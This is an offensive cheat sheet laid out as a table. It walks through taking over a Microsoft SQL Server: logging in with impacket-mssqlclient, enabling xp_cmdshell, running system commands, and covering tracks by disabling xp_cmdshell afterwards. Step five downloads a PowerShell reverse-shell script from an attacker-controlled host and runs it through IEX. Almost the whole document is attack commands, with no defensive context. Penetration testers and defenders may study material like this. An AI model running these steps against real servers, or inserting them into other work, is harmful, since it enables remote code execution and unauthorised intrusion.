| **Step**                       | **Command/Action**                                                                                      | **Description**                                                                                               |
|--------------------------------|---------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------|
| **1. Connect to SQL Server**   | `impacket-mssqlclient <domain>/<username>:<password>@<ip_address>`                                             | Connect to the target SQL server using valid credentials.                                                     |
| **2. Check SQL Version**       | `SELECT @@version;`                                                                                      | Verify the version of SQL Server, as this helps identify vulnerabilities or possible exploitation techniques. |
| **3. Enable xp_cmdshell**      | `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;` | Enable `xp_cmdshell` if it's not already enabled, allowing command execution on the server.                   |
| **4. Execute Commands**        | `EXEC xp_cmdshell 'whoami';`                                                                             | Execute system commands via `xp_cmdshell`.                                                                    |
| **5. Establish Reverse Shell** | `EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<your_ip>/shell.ps1')"'` | Use `xp_cmdshell` to download and execute a PowerShell script for a reverse shell.                            |
| **6. Clean Up**                | `EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;` | Disable `xp_cmdshell` and revert SQL Server settings to their original state.                                  |
